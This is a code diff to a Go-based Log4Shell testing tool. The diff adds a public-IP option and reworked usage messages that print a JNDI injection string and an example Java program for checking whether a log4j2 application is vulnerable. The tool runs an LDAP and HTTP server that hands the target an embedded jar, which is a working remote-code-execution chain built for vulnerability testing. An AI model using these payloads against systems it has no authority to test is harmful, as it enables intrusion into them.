@@ -2,6 +2,7 @@ package main
 
 import (
 	"embed"
+	"flag"
 	"fmt"
 	"github.com/logrusorgru/aurora"
 	"github.com/lor00x/goldap/message"
@@ -22,7 +23,12 @@ import (
 //go:embed evilfactory-1.0-SNAPSHOT.jar
 var jar embed.FS
 
+var publicHost string
+
 func main() {
+	flag.StringVar(&publicHost, "publicIp", os.Getenv("publicIp"), "Usage:$ log4shell-ldap --publicIp 192.168.1.1")
+	flag.Parse()
+
 	printUsage()
 	ldapServer := startLdapServer()
 	startHttpServer()
@@ -35,26 +41,49 @@ func main() {
 }
 
 func printUsage() {
-	fmt.Println("Try to make log4j2 to print ${jndi:ldap://<IP>:1389/probably_not_vulnerable}")
-	fmt.Println("Example: ")
+	var ip string
+	if publicHost == "" {
+		ip = "<IP>"
+		if isRunningInDockerContainer() {
+			fmt.Println(aurora.Red("It appears this tool is running inside a container and no public IP has been set! ❌"))
+			fmt.Println(aurora.Red("The tool requires public IP to be set explicitly when running in a container! ❌"))
+			fmt.Printf("%s %s ℹ️\n", aurora.Green("Example usage:"), aurora.Yellow("docker run -p 3000:3000 -p 1389:1389 -e publicIp=192.168.1.1 log4shell"))
+			fmt.Printf("%s ❌\n", aurora.Red("It's important to map the ports to the same port numbers on the host computer. If you remap them to other ports then the tool might not work reliably!"))
+			os.Exit(1)
+		} else {
+			fmt.Printf("It appears the tool is %s running inside a container and no public IP has been explicitly set! ⚠️\n", aurora.Red("NOT"))
+			fmt.Printf("The tool will try to deduce what IP to include in LDAP response by checking local IP in incoming LDAP connections.\n")
+			fmt.Printf("%s ⚠️\n", aurora.Red("This might not work reliably and it's recommended to explicit set public IP!"))
+			fmt.Printf("Hint: You can set an explicit public IP by passing the %s flag ℹ️\n", aurora.Blue("--publicIp"))
+			fmt.Printf("Example: %s\n", aurora.Blue("./log4shell-ldap --publicIp 192.168.1.1"))
+			fmt.Printf("Detected following IP addresses: %s\n", aurora.Blue(strings.Join(getIpv4Addresses(), ", ")))
+		}
+	} else {
+		ip = publicHost
+		fmt.Printf("Public IP address explicitly set to %s ✅\n", aurora.Blue(publicHost))
+	}
+	fmt.Printf("Test connectivity by executing %s from the same computer where the target application is running ℹ️\n", aurora.Blue(fmt.Sprintf("curl http://%s:3000", ip)))
 	fmt.Println("----")
-	fmt.Println(aurora.Blue(`package info.jerrinot.log4shell.test;
+	fmt.Printf("Usage: Make log4j2 to print %s ℹ️\n", aurora.Blue(fmt.Sprintf("${jndi:ldap://%s:1389/probably_not_vulnerable}", ip)))
+	fmt.Println("Example Java Application: ")
+	fmt.Println(aurora.Yellow(fmt.Sprintf(`package mypackage;
 
 import org.apache.logging.log4j.LogManager;
 
 public class Main {
     public static void main(String[] args) throws Exception {
-        LogManager.getLogger(Main.class).fatal("${jndi:ldap://172.17.0.2:1389/probably_not_vulnerable}");
+        LogManager.getLogger(Main.class).fatal("${jndi:ldap://%s:1389/probably_not_vulnerable}");
     }
-}`))
-	fmt.Println("----")
-	if isRunningInDockerContainer() {
-		fmt.Println("I appears this application is running inside a container. ")
-	} else {
-		fmt.Println("I appears this application is NOT running inside a container. This means you have to use IP address of this host in the jndi string.")
-		fmt.Printf("Here are possible IP addresses: %s\n", strings.Join(getIpv4Addresses(), ", "))
-		fmt.Println("Test connectivity by running \"curl http://<IP>:3000\" from the same computer where the target application is running.")
-	}
+}`, ip)))
+	fmt.Println()
+	fmt.Printf("There are 3 possible outcomes:\n")
+	fmt.Printf(`1. The application prints %s. This is happening when a vulnerable log4j2 version is executed on old Java.") 
+   This is the worst case as it allows a very simple arbitrary remote code execution."
+2. The application prints %s. This means a vulnerable log4j2 version is executed on recent Java. 
+   This makes it a bit harder to abuse the vulnerability, but RCE may still be possible and there is also a risk of DoS.
+3. The application prints %s 
+   This means the application is either not vulnerable or the test is misconfigured :)
+`, aurora.Blue("totally pwned!"), aurora.Blue("Reference Class Name: probably vulnerable"), aurora.Blue(fmt.Sprintf("${jndi:ldap://%s:1389/probably_not_vulnerable}", ip)))
 }
 
 func startLdapServer() *ldap.Server {
@@ -118,6 +147,9 @@ func startHttpServer() {
 }
 
 func getOwnAddress(m *ldap.Message) string {
+	if publicHost != "" {
+		return publicHost
+	}
 	foo := m.Client
 	rs := reflect.ValueOf(foo).Elem()
 	rf := rs.Field(2)
